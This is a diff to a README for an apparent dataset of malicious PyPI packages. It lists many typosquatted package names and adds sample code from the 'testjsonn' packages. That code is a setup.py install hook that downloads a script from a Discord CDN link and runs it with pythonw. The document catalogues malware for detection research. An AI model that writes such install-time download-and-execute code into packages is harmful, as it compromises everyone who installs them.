@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 7,224 versions of the source code of 6,116 malicious packages.
+This data set includes about 7,233 versions of the source code of 6,118 malicious packages.
 
 ## Dataset Format
 
@@ -1085,6 +1085,65 @@ discord-py-bot [0.0.1] <br>
 
 ### 04 Aug. 2024
 pygaqme seccache driftme pytorchg pytorch-triton sjmplejson pytirch beautyfulsoup pygzme matplkotlib mozilla localization-utils zuppa beautifilsoop splib-http pywarder matplotblib pythrch pztorch pygfme .DS_Store pytorbch pygamne beaitifulsoop pygacme matplotlob ss-concurrent-log-handler simpkejson pygqame nir-bb-test beutifulsoop spl-types matplotlpib matplttlib simplejason simplejsoh beautifulsoupo pygarme catme urtelib32 pqtorch pytorcb simolejson django-log-tracker matplottbib pygane pygamm beutifullsoup matpllotib prometheus-http-client-shopee matplotib beautifoulsoup beautifulsoup aiohttp-proxy-connect matploltlab matplotllib matplorlib pygamw matplftlib matplotlr matplootib beautifulsoul fnbot2 beuatiflsoup pytorchc pytarch pygraphql32 matplotklib pytorcdh color-vividpy matplolplib libwebp ascii2art pytorchb beautysoup pygamse pygawme sijplejson ethereum2 matploltlib beautifolsoup pytorchy pygxme beaotifulsoup sjimplejson beautifulsoop ca-certificates sea-django-mysqlpool modularseven hypixelmc simpoejson locute simplejdon maptplotlib pytoich pytordh huehuehuehue pygaome np6helperhttptest pygaeme hymcapi np6helperhttper python-splib ssc-concurrent-log-handler pygazme simepljson pygvame beautifilsoup pygume simplejsoj raydium pytrosh pytorch sol-instruct test-test-test123 matpliotlib pygmme pygamr matplotkib beautifullsoop beaufifulsoup matplotoib siplejason beautifullsooup sol-structs azureml-contrib-jupyterrun cloud-client raydium-sdk
+
+
+### 08 Aug. 2024
+
+testjsonn1 [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7] <br>
+testjsonn2 [0.1] <br>
+testjsonn3 [0.1] <br>
+
+```python
+
+class CustomCommand(Command):
+    description = 'Run custom function during installation'
+    user_options = []
+    
+
+    def initialize_options(self):
+        pass
+
+    def finalize_options(self):
+        pass
+
+    def run(self):
+        from testjsonn1 import main
+        import requests
+        main('https://cdn.discordapp.com/attachments/1083783447291629640/1264384843379249272/my_script.py?ex=669dada5&is=669c5c25&hm=9a2a1345fea56d35da0d45a1743485a48730556ccebf4c2d056206deb43c991d&', 'testnp.py')
+
+
+import subprocess
+import sys
+
+def install_library(library_name):
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", library_name])
+        print(f"'{library_name}' has been installed successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"An error occurred while trying to install '{library_name}': {e}")
+
+# Replace 'requests' with the name of the library you want to install
+
+install_library('requests')
+
+def main(url, filename):
+    # Download the file
+    import requests
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(filename, 'wb') as file:
+            file.write(response.content)
+        print(f"Downloaded file saved as {filename}")
+        
+        # Execute the file
+        try:
+            subprocess.run(['pythonw', filename], check=True)
+            print(f"Execution of {filename} was successful.")
+        except subprocess.CalledProcessError as e:
+            print(f"Error during execution: {e}")
+    else:
+        print(f"Failed to download file. Status code: {response.status_code}")
+```
 
 
 ## About the malicious packages detection
